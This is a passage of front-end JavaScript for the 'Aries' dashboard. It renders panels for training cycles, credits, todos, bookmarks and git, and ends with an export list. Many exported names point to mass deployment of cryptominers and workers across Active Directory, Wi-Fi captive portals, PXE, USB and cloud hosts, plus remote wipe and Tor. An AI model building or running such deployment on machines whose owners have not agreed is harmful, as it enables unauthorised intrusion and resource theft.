      // Auto-refresh
      if (_aresRefreshTimer) clearInterval(_aresRefreshTimer);
      _aresRefreshTimer = setInterval(function() {
        if (currentPanel === 'ares') loadAres();
      }, 30000);
    }

    function aresGenerateData() {
      var catEl = document.getElementById('aresDataCategory');
      var category = catEl ? catEl.value : 'reasoning';
      toast('Generating ' + category + ' training data from Opus...', 'info');
      api('POST', 'ares/data/generate', { category: category, count: 10 }).then(function(r) {
        toast('Generated ' + (r.generated || 0) + ' examples (' + category + ')', 'success');
        loadAres();
      }).catch(function(e) { toast('Generation failed: ' + e.message, 'error'); });
    }

    function aresStartCycle() {
      if (!confirm('Start a new ARES training cycle? This will generate data, train, and evaluate.')) return;
      toast('Starting ARES training cycle...', 'info');
      api('POST', 'ares/training/start').then(function(r) {
        toast('Training cycle started', 'success');
        loadAres();
      }).catch(function(e) { toast('Failed: ' + e.message, 'error'); });
    }

    function aresSetSchedule() {
      var sel = document.getElementById('aresSchedule');
      var schedule = sel ? sel.value : null;
      api('POST', 'ares/schedule', { schedule: schedule || null }).then(function() {
        toast('Schedule updated: ' + (schedule || 'manual'), 'success');
      }).catch(function(e) { toast('Failed: ' + e.message, 'error'); });
    }

    // ═══ Credits ═══
    function loadCredits() {
      var el = document.getElementById('creditsContent'); if (!el) return;
      api('GET', 'credits').then(function(d) {
        var tiers = ['FREE', 'CONTRIBUTOR', 'TRAINER', 'CORE'];
        var tierColors = ['#666', '#0ff', '#f0f', '#ff0'];
        var ci = d.tierIndex || 0;
        var html = '<div style="text-align:center;padding:30px 20px">';
        html += '<div style="font-size:64px;margin-bottom:12px">&#x1F3C6;</div>';
        html += '<div style="font-size:48px;font-weight:bold;color:var(--accent);margin-bottom:4px">' + (d.balance || 0).toLocaleString() + '</div>';
        html += '<div style="color:var(--text-dim);margin-bottom:24px">CREDITS</div>';
        // Tier badge
        html += '<div style="display:inline-block;padding:6px 20px;border:2px solid ' + tierColors[ci] + ';border-radius:20px;color:' + tierColors[ci] + ';font-weight:bold;font-size:14px;margin-bottom:20px">' + (d.tier || 'FREE') + ' TIER</div>';
        // Progress bar
        if (d.nextTier) {
          html += '<div style="max-width:400px;margin:0 auto 24px"><div style="display:flex;justify-content:space-between;font-size:12px;color:var(--text-dim);margin-bottom:4px"><span>' + d.tier + '</span><span>' + d.nextTier + ' (' + (d.nextTierMin || 0).toLocaleString() + ' credits)</span></div>';
          html += '<div style="background:#1a1a2e;border-radius:10px;height:12px;overflow:hidden"><div style="background:linear-gradient(90deg,' + tierColors[ci] + ',' + tierColors[ci+1] + ');width:' + (d.progress || 0) + '%;height:100%;border-radius:10px;transition:width 0.5s"></div></div></div>';
        }
        // Earning rates
        html += '<div style="max-width:500px;margin:0 auto 24px;text-align:left">';
        html += '<h3 style="color:var(--accent);margin:0 0 12px">&#x1F4B0; How to Earn Credits</h3>';
        var rates = [['Join network', '+50 welcome bonus'], ['Compute contribution', '+1/hour'], ['Complete AI task', '+5-50 per task'], ['Share model training', '+10/session'], ['Daily active bonus', '+5/day'], ['Refer a friend', '+25 each']];
        for (var i = 0; i < rates.length; i++) html += '<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #1a1a2e"><span style="color:var(--text)">' + rates[i][0] + '</span><span style="color:#0f0;font-weight:bold">' + rates[i][1] + '</span></div>';
        html += '</div>';
        // Join button or stats
        if (!d.joined) {
          html += '<button class="btn-primary" style="padding:14px 40px;font-size:16px;border-radius:12px" onclick="window.aries.joinNetwork()">&#x1F680; Join Aries Network</button>';
        } else {
          html += '<div style="max-width:500px;margin:0 auto;text-align:left"><h3 style="color:var(--accent);margin:0 0 12px">&#x1F4CA; Your Stats</h3>';
          var s = d.stats || {};
          html += '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">';
          html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:10px;padding:16px;text-align:center"><div style="font-size:24px;color:var(--accent);font-weight:bold">' + (s.computeHours || 0) + '</div><div style="color:var(--text-dim);font-size:11px">Compute Hours</div></div>';
          html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:10px;padding:16px;text-align:center"><div style="font-size:24px;color:var(--accent);font-weight:bold">' + (s.tasksCompleted || 0) + '</div><div style="color:var(--text-dim);font-size:11px">Tasks Done</div></div>';
          html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:10px;padding:16px;text-align:center"><div style="font-size:24px;color:var(--accent);font-weight:bold">' + (s.daysActive || 0) + '</div><div style="color:var(--text-dim);font-size:11px">Days Active</div></div>';
          html += '</div></div>';
        }
        // History
        if (d.history && d.history.length) {
          html += '<div style="max-width:500px;margin:24px auto 0;text-align:left"><h3 style="color:var(--accent);margin:0 0 12px">&#x1F4DC; Recent Activity</h3>';
          for (var h = 0; h < Math.min(d.history.length, 10); h++) {
            var e = d.history[h]; var isEarn = e.type === 'earn';
            html += '<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #111"><span style="color:var(--text-dim);font-size:12px">' + escapeHtml(e.reason || '') + '</span><span style="color:' + (isEarn ? '#0f0' : '#f55') + ';font-weight:bold">' + (isEarn ? '+' : '-') + (e.amount || 0) + '</span></div>';
          }
          html += '</div>';
        }
        html += '</div>';
        el.innerHTML = html;
      }).catch(function() { el.innerHTML = '<div style="text-align:center;padding:40px;color:var(--text-dim)">Failed to load credits</div>'; });
    }
    function joinNetwork() { api('POST', 'credits', { action: 'join' }).then(function() { toast('Welcome to Aries Network! +50 credits', 'success'); loadCredits(); }).catch(function(e) { toast(e.message, 'error'); }); }

    // ═══ Todos ═══
    function loadTodos() {
      var el = document.getElementById('todosContent'); if (!el) return;
      api('GET', 'todos').then(function(d) {
        var todos = d.todos || [];
        if (!todos.length) { el.innerHTML = '<div style="text-align:center;padding:40px;color:var(--text-dim)">No tasks yet. Add one above!</div>'; return; }
        var html = '';
        var priColors = { high: '#f55', normal: 'var(--accent)', low: '#666' };
        for (var i = 0; i < todos.length; i++) {
          var t = todos[i];
          html += '<div style="display:flex;align-items:center;gap:12px;padding:12px 16px;border-bottom:1px solid #1a1a2e;opacity:' + (t.done ? '0.5' : '1') + '">';
          html += '<input type="checkbox" ' + (t.done ? 'checked' : '') + ' onchange="window.aries.toggleTodo(\'' + t.id + '\')" style="width:18px;height:18px;accent-color:var(--accent)" />';
          html += '<span style="flex:1;text-decoration:' + (t.done ? 'line-through' : 'none') + ';color:var(--text)">' + escapeHtml(t.text) + '</span>';
          html += '<span style="font-size:10px;color:' + (priColors[t.priority] || priColors.normal) + ';text-transform:uppercase">' + (t.priority || 'normal') + '</span>';
          html += '<button class="btn-sm" onclick="window.aries.deleteTodo(\'' + t.id + '\')" style="color:#f55">&#x2716;</button>';
          html += '</div>';
        }
        el.innerHTML = html;
      }).catch(function() { el.innerHTML = '<div style="color:#f55">Failed to load tasks</div>'; });
    }
    function addTodo() { var inp = document.getElementById('todoInput'); var pri = document.getElementById('todoPriority'); if (!inp || !inp.value.trim()) return; api('POST', 'todos', { action: 'add', text: inp.value.trim(), priority: pri ? pri.value : 'normal' }).then(function() { inp.value = ''; loadTodos(); }).catch(function(e) { toast(e.message, 'error'); }); }
    function toggleTodo(id) { api('POST', 'todos', { action: 'toggle', id: id }).then(function() { loadTodos(); }); }
    function deleteTodo(id) { api('POST', 'todos', { action: 'delete', id: id }).then(function() { loadTodos(); }); }

    // ═══ Bookmarks ═══
    function loadBookmarks() {
      var el = document.getElementById('bookmarksContent'); if (!el) return;
      api('GET', 'bookmarks').then(function(d) {
        var bms = d.bookmarks || [];
        if (!bms.length) { el.innerHTML = '<div style="text-align:center;padding:40px;color:var(--text-dim)">No bookmarks yet. Save one above!</div>'; return; }
        var html = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px;padding:8px">';
        for (var i = 0; i < bms.length; i++) {
          var b = bms[i];
          html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:10px;padding:14px">';
          html += '<div style="display:flex;justify-content:space-between;align-items:start"><a href="' + escapeHtml(b.url) + '" target="_blank" style="color:var(--accent);text-decoration:none;font-weight:bold;word-break:break-all">' + escapeHtml(b.title || b.url) + '</a>';
          html += '<button class="btn-sm" onclick="window.aries.deleteBookmark(\'' + b.id + '\')" style="color:#f55;flex-shrink:0">&#x2716;</button></div>';
          html += '<div style="color:var(--text-dim);font-size:11px;margin-top:4px;word-break:break-all">' + escapeHtml(b.url) + '</div>';
          if (b.tags && b.tags.length) { html += '<div style="margin-top:6px;display:flex;gap:4px;flex-wrap:wrap">'; for (var t = 0; t < b.tags.length; t++) html += '<span style="background:#1a1a2e;color:var(--accent);padding:2px 8px;border-radius:10px;font-size:10px">' + escapeHtml(b.tags[t]) + '</span>'; html += '</div>'; }
          html += '</div>';
        }
        html += '</div>';
        el.innerHTML = html;
      }).catch(function() { el.innerHTML = '<div style="color:#f55">Failed to load bookmarks</div>'; });
    }
    function addBookmark() { var u = document.getElementById('bmUrl'), t = document.getElementById('bmTitle'), tg = document.getElementById('bmTags'); if (!u || !u.value.trim()) return; var tags = tg && tg.value ? tg.value.split(',').map(function(s) { return s.trim(); }).filter(Boolean) : []; api('POST', 'bookmarks', { action: 'add', url: u.value.trim(), title: t ? t.value.trim() : '', tags: tags }).then(function() { u.value = ''; if(t) t.value = ''; if(tg) tg.value = ''; loadBookmarks(); }).catch(function(e) { toast(e.message, 'error'); }); }
    function deleteBookmark(id) { api('POST', 'bookmarks', { action: 'delete', id: id }).then(function() { loadBookmarks(); }); }

    // ═══ Git ═══
    function loadGit() {
      var el = document.getElementById('gitContent'); if (!el) return;
      api('GET', 'git/status').then(function(d) {
        if (d.error) { el.innerHTML = '<span style="color:#f55">' + escapeHtml(d.error) + '</span>'; return; }
        var html = '<span style="color:var(--accent);font-weight:bold">Branch: ' + escapeHtml(d.branch || 'unknown') + '</span>\n\n';
        if (d.files && d.files.length) { html += '<span style="color:#0f0">Changed files:</span>\n'; for (var i = 0; i < d.files.length; i++) html += '  <span style="color:#ff0">' + escapeHtml(d.files[i].status) + '</span> ' + escapeHtml(d.files[i].file) + '\n'; }
        else html += '<span style="color:#0f0">Working tree clean</span>\n';
        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<span style="color:#f55">' + escapeHtml(e.message) + '</span>'; });
    }
    function runGit() { var inp = document.getElementById('gitCmd'); if (!inp || !inp.value.trim()) return; var el = document.getElementById('gitContent'); el.innerHTML = '<div class="spinner"></div> Running...'; api('POST', 'git/command', { command: inp.value.trim() }).then(function(d) { var html = ''; if (d.output) html += escapeHtml(d.output); if (d.error) html += '\n<span style="color:#f55">' + escapeHtml(d.error) + '</span>'; el.innerHTML = html || '<span style="color:var(--text-dim)">No output</span>'; }).catch(function(e) { el.innerHTML = '<span style="color:#f55">' + escapeHtml(e.message) + '</span>'; }); }

    window.aries = {
      switchPanel: switchPanel, refreshAgents: refreshAgents, openAgentDetail: openAgentDetail, closeAgentDetail: closeAgentDetail, sendAgentTask: sendAgentTask, refreshSwarm: refreshSwarm,
      submitSwarmTask: submitSwarmTask, refreshLogs: refreshLogs, createBackup: createBackup,
      restoreBackup: restoreBackup, runSandbox: runSandbox, webSearch: webSearch,
      searchSkills: searchSkills, importSkill: importSkill, installHubSkill: installHubSkill,
      addMemory: addMemory, searchRag: searchRag, addRagDoc: addRagDoc,
      browserGo: browserGo, addWatch: addWatch, saveSettings: saveSettings,
      testAiToken: testAiToken, saveAiToken: saveAiToken, setTheme: setTheme,
      startPacketSend: startPacketSend, stopPacketSend: stopPacketSend,
      refreshPacketSend: refreshPacketSend, runEvolve: runEvolve, loadEvolve: loadEvolve,
      refreshProviders: refreshProviders, testAllProviders: testAllProviders,
      showAddProvider: showAddProvider, fillProviderPreset: fillProviderPreset,
      addProvider: addProvider, removeProvider: removeProvider, testProvider: testProvider,
      showAddSwarmAgent: showAddSwarmAgent, addSwarmAgent: addSwarmAgent,
      removeSwarmAgent: removeSwarmAgent, batchAgents: batchAgents,
      refreshKeyVault: refreshKeyVault, showFreeKeys: showFreeKeys,
      loadFreeKeys: loadFreeKeys, saveAndTestKey: saveAndTestKey,
      saveAndTestFreeKey: saveAndTestFreeKey, exportKeys: exportKeys,
      promptImportKeys: promptImportKeys, generateTool: generateTool,
      createAgent: createAgent, refreshUsbSwarm: loadUsbSwarmData, flashUsb: flashUsb, refreshUsbDrives: refreshUsbDrives,
      toggleMining: toggleMining, saveMinerConfig: saveMinerConfig,
      setMinerIntensity: setMinerIntensity, showUsbDeployInstructions: showUsbDeployInstructions,
      refreshMiner: refreshMiner, pushWorkerUpdate: pushWorkerUpdate, scanNetwork: scanNetwork, pingHost: pingHost,
      refreshMonitor: refreshMonitor, killProcess: killProcess,
      refreshModels: refreshModels, pullModel: pullModel, execTerminal: execTerminal,
      toggleNotifications: toggleNotifications, exportChat: exportChat,
      clearChat: clearChat, removeAttachment: removeAttachment, copyCode: copyCode,
      dismissWelcome: dismissWelcome, exportSwarmCSV: exportSwarmCSV,
      exportNetworkCSV: exportNetworkCSV, exportPnlCSV: exportPnlCSV,
      networkScan: networkScan, netDeploy: netDeploy,
      setNetAutoDeploy: setNetAutoDeploy, showNetDeployLog: showNetDeployLog,
      loadMemory: loadMemory, loadRag: loadRag, uploadRagFile: uploadRagFile, loadSkills: loadSkills,
      loadBrowser: loadBrowser, loadGateway: loadGateway, loadSentinel: loadSentinel,
      loadSettings: loadSettings, loadBackup: loadBackup, toast: toast,
      runDistributedAi: runDistributedAi, refreshModelMatrix: refreshModelMatrix,
      shareModelTo: shareModelTo,
      refreshAdDeploy: loadAdDeploy, adConnect: adConnect, adListComputers: adListComputers,
      adDeployAll: adDeployAll, adDeploySelected: adDeploySelected, adDeployOne: adDeployOne,
      _adToggleAll: _adToggleAll,
      loadFleetDeploy: loadFleetDeploy, fleetAddHost: fleetAddHost, fleetDeploy: fleetDeploy,
      refreshWifiDeploy: loadWifiDeploy, toggleCaptivePortal: toggleCaptivePortal,
      saveCaptiveConfig: saveCaptiveConfig, addSSID: addSSID, removeSSID: removeSSID,
      wifiScan: wifiScan, wifiArpScan: wifiArpScan, wifiDeployTo: wifiDeployTo,
      loadProfitDashboard: loadProfitDashboard, loadWorkerChat: loadWorkerChat, sendWorkerChat: sendWorkerChat,
      generateContent: generateContent, refreshContentFarm: refreshContentFarm,
      saveOracleCredentials: saveOracleCredentials, provisionOracle: provisionOracle, refreshOracleCloud: refreshOracleCloud,
      loadCloudScale: loadCloudScale, cloudProvision: cloudProvision, cloudDestroy: cloudDestroy,
      refreshWorkerHealth: refreshWorkerHealth,
      refreshMarketplace: refreshMarketplace,
      refreshDocker: refreshDocker, copyDockerfile: copyDockerfile, copyDockerRun: copyDockerRun,
      copyDockerCompose: copyDockerCompose, buildDockerImage: buildDockerImage,
      torStart: torStart, torStop: torStop, torRefresh: torRefresh,
      swarmDestruct: swarmDestruct,
      loadPxeBoot: loadPxeBoot, togglePxeServer: togglePxeServer,
      loadNetworkWatcher: loadNetworkWatcher, watcherToggle: watcherToggle,
      watcherAutoApprove: watcherAutoApprove, watcherAddSite: watcherAddSite,
      watcherApprove: watcherApprove, watcherApproveAll: watcherApproveAll,
      watcherReject: watcherReject,
      loadDeployLearner: loadDeployLearner, deployLearnerRetryAll: deployLearnerRetryAll,
      deployLearnerStrategy: deployLearnerStrategy,
      loadWolManager: loadWolManager, wolWakeAll: wolWakeAll, wolWakeSite: wolWakeSite,
      wolWakeOne: wolWakeOne, wolToggleWatchdog: wolToggleWatchdog,
      wolPxeForceAll: wolPxeForceAll, wolPxeForceSite: wolPxeForceSite, wolPxeForce: wolPxeForce,
      wolAddDevice: wolAddDevice,
      loadMassDeploy: loadMassDeploy, copyMassDeployCmd: copyMassDeployCmd,
      buildMassInstaller: buildMassInstaller,
      loadLinkDeploy: loadLinkDeploy, generateDeployLink: generateDeployLink,
      revokeDeployLink: revokeDeployLink, showQR: showQR,
      loadHashrateOpt: loadHashrateOpt, optimizeWorker: optimizeWorker,
      optimizeAll: optimizeAll, setWorkerThreads: setWorkerThreads,
      pushSwarmUpdate: pushSwarmUpdate,
      loadGpuMining: loadGpuMining, gpuDetect: gpuDetect, gpuStart: gpuStart, gpuStop: gpuStop,
      algoSwitch: algoSwitch, algoRefreshProfit: algoRefreshProfit,
      algoAutoSwitch: algoAutoSwitch, algoBroadcast: algoBroadcast,
      loadMeshNetwork: loadMeshNetwork, meshReElect: meshReElect,
      loadSiteControl: loadSiteControl, siteAdd: siteAdd, siteBecomeController: siteBecomeController,
      siteCommand: siteCommand, siteBroadcast: siteBroadcast, siteRemove: siteRemove, siteWorkers: siteWorkers,
      loadRelayFederation: loadRelayFederation, fedAddRelay: fedAddRelay,
      fedRemoveRelay: fedRemoveRelay, fedSyncNow: fedSyncNow,
      fedBroadcast: fedBroadcast, fedDeploy: fedDeploy, fedDeploySubmit: fedDeploySubmit,
      loadRemoteWipe: loadRemoteWipe, wipeDevice: wipeDevice, wipeStuck: wipeStuck, wipeSite: wipeSite,
      loadSwarmIntel: loadSwarmIntel, intelApply: intelApply, intelAutoToggle: intelAutoToggle, intelBroadcast: intelBroadcast,
      loadProxyNetwork: loadProxyNetwork,
      loadVbox: loadVbox, vboxCreateWorkers: vboxCreateWorkers, vboxCreateTemplate: vboxCreateTemplate,
      vboxStart: vboxStart, vboxStop: vboxStop, vboxDelete: vboxDelete, vboxTakeSnapshot: vboxTakeSnapshot,
      loadCloudAuto: loadCloudAuto, cloudAutoAddCreds: cloudAutoAddCreds,
      loadHotspot: loadHotspot, hotspotStart: hotspotStart, hotspotStop: hotspotStop,
      hotspotCheckHw: hotspotCheckHw, hotspotAutoDeploy: hotspotAutoDeploy, hotspotDeploy: hotspotDeploy, cloudAutoAddCreds: cloudAutoAddCreds,
      loadCrossSite: loadCrossSite,
      loadAres: loadAres, aresGenerateData: aresGenerateData, aresStartCycle: aresStartCycle,
      joinSwarmWorker: joinSwarmWorker, leaveSwarmWorker: leaveSwarmWorker,
      workerControl: workerControl, minerControl: minerControl,
      refreshWorkerDashboard: refreshWorkerDashboard,
      quickJoinFromWelcome: quickJoinFromWelcome, dismissFirstTime: dismissFirstTime,
      showSharePanel: showSharePanel, shareOnTwitter: shareOnTwitter,
      shareOnReddit: shareOnReddit, shareOnDiscord: shareOnDiscord,
      copyInstallCmd: copyInstallCmd, checkAutoUpdate: checkAutoUpdate,
      loadAres: loadAres, aresGenerateData: aresGenerateData,
      aresStartCycle: aresStartCycle, aresSetSchedule: aresSetSchedule,
      refreshAriesAi: refreshAriesAi, saveApiKeys: saveApiKeys, settingsPullModel: settingsPullModel,
      loadCredits: loadCredits, joinNetwork: joinNetwork,
      loadTodos: loadTodos, addTodo: addTodo, toggleTodo: toggleTodo, deleteTodo: deleteTodo,
      loadBookmarks: loadBookmarks, addBookmark: addBookmark, deleteBookmark: deleteBookmark,
      loadGit: loadGit, runGit: runGit,
      _loadedPanels: _loadedPanels, _toast: toast
    };
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();